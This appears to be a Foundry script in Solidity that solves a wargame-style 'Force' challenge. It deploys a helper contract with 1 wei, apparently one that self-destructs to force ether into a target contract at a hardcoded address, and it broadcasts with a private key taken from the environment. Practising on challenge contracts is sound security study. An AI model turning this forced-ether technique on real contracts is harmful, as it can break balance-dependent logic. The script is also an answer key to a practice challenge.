// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Force} from "../src/Force.sol";
import {SelfDest} from "../src/SelfDest.sol";
import {Script, console} from "forge-std/script.sol";

contract ForceSolution is Script {
    Force force = Force(0x1E2BB8DE5e4D30Fc7e187f09e218a1A66520C043);
    SelfDest selfDest;

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new SelfDest{value: 1 wei}(payable(address(force)));
        vm.stopBroadcast();
    }
}
